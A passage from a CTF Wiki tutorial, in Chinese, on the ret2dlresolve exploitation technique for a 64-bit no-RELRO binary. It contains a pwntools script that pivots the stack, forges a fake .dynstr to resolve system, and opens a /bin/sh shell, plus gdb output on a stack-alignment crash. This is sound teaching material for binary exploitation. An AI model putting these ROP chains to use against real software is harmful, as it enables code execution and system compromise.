poprbp_ret = 0x400588
def csu(rbx, rbp, r12, r13, r14, r15):
    # pop rbx, rbp, r12, r13, r14, r15
    # rbx = 0
    # rbp = 1, enable not to jump
    # r12 should be the function that you want to call
    # rdi = edi = r13d
    # rsi = r14
    # rdx = r15
    payload = p64(csu_end_addr)
    payload += p64(rbx) + p64(rbp) + p64(r12) + p64(r13) + p64(r14) + p64(r15)
    payload += p64(csu_front_addr)
    payload += 'a' * 0x38
    return payload

io.recvuntil('Welcome to XDCTF2015~!\n')

# stack privot to bss segment, set rsp = new_stack
stack_size = 0x188 # new stack size is 0x188
new_stack = bss_addr+0x200

offset = 112+8
rop.raw(offset*'a')
payload1 = csu(0, 1 ,elf.got['read'],0,new_stack,stack_size)
rop.raw(payload1)
rop.raw(0x400607)
assert(len(rop.chain())<=256)
rop.raw("a"*(256-len(rop.chain())))
gdb.attach(io)
io.send(rop.chain())

# construct fake stack
rop = ROP("./main_no_relro_64")
rop.raw(csu(0, 1 ,elf.got['read'],0,0x600988+8,8))  # modify .dynstr pointer in .dynamic section to a specific location
dynstr = elf.get_section_by_name('.dynstr').data()
dynstr = dynstr.replace("read","system")
rop.raw(csu(0, 1 ,elf.got['read'],0,0x600B30,len(dynstr)))  # construct a fake dynstr section
rop.raw(csu(0, 1 ,elf.got['read'],0,0x600B30+len(dynstr),len("/bin/sh\x00")))  # read /bin/sh\x00
rop.raw(0x0000000000400773) # pop rdi; ret
rop.raw(0x600B30+len(dynstr))
rop.raw(0x400516) # the second instruction of read@plt 
rop.raw(0xdeadbeef)
print(len(rop.chain()))
rop.raw('a'*(stack_size-len(rop.chain())))
io.send(rop.chain())


# reuse the vuln to stack pivot
rop = ROP("./main_no_relro_64")
rop.raw(offset*'a')
rop.migrate(new_stack)
assert(len(rop.chain())<=256)
io.send(rop.chain()+'a'*(256-len(rop.chain())))

# now, we are on the new stack
io.send(p64(0x600B30)) # fake dynstr location
io.send(dynstr) # fake dynstr
io.send("/bin/sh\x00")

io.interactive()
```

此时，我们发现程序又崩了，通过 coredump
```bash
❯ gdb -c core
```

我们发现，在处理 xmm 相关的指令时崩了
```
 ► 0x7fa8677a3396    movaps xmmword ptr [rsp + 0x40], xmm0
   0x7fa8677a339b    call   0x7fa8677931c0 <0x7fa8677931c0>
 
   0x7fa8677a33a0    lea    rsi, [rip + 0x39e259]
   0x7fa8677a33a7    xor    edx, edx
   0x7fa8677a33a9    mov    edi, 3
   0x7fa8677a33ae    call   0x7fa8677931c0 <0x7fa8677931c0>
 
   0x7fa8677a33b3    xor    edx, edx
   0x7fa8677a33b5    mov    rsi, rbp
   0x7fa8677a33b8    mov    edi, 2
   0x7fa8677a33bd    call   0x7fa8677931f0 <0x7fa8677931f0>
 
   0x7fa8677a33c2    mov    rax, qword ptr [rip + 0x39badf]
───────────────────────────────────────────────────────────────────────────────────────[ STACK ]───────────────────────────────────────────────────────────────────────────────────────
00:0000│ rsp  0x600d18 ◂— 0x0
01:0008│      0x600d20 —▸ 0x7fa8679080f7 ◂— 0x2f6e69622f00632d /* '-c' */
02:0010│      0x600d28 ◂— 0x0
03:0018│      0x600d30 —▸ 0x40076a ◂— pop    rbx
04:0020│      0x600d38 —▸ 0x7fa8677a3400 ◂— 0x9be1f8b53
05:0028│      0x600d40 —▸ 0x600d34 ◂— 0x677a340000000000
06:0030│      0x600d48 ◂— 0x8000000000000006
07:0038│      0x600d50 ◂— 0x0

```

由于 xmm 相关指令要求地址应该是 16 字节对齐的，而此时 rsp 并不是 16 字节对齐的。因此我们可以简单地调整一下栈，来使得栈是 16 字节对齐的。
```python
from pwn import *
# context.log_level="debug"
# context.terminal = ["tmux","splitw","-h"]
context.arch="amd64"
io = process("./main_no_relro_64")
rop = ROP("./main_no_relro_64")
elf = ELF("./main_no_relro_64")

bss_addr = elf.bss()
csu_front_addr = 0x400750
csu_end_addr = 0x40076A
leave_ret  =0x40063c
poprbp_ret = 0x400588
def csu(rbx, rbp, r12, r13, r14, r15):
```

---

*Truncated at 1500 lines. Full text: <https://github.com/ctf-wiki/ctf-wiki/blob/e225ddfcd420a7f54a5940f47336ebdf8c29b875/docs/zh/docs/pwn/linux/user-mode/stackoverflow/x86/advanced-rop/ret2dlresolve.md>*


---

## Source

CTF Wiki - <https://github.com/ctf-wiki/ctf-wiki/blob/e225ddfcd420a7f54a5940f47336ebdf8c29b875/docs/zh/docs/pwn/linux/user-mode/stackoverflow/x86/advanced-rop/ret2dlresolve.md>

Mirrored into CTF-Brain at commit `e225ddfcd420`. Licence: CC BY-NC-SA 4.0. The text is the original authors' work.
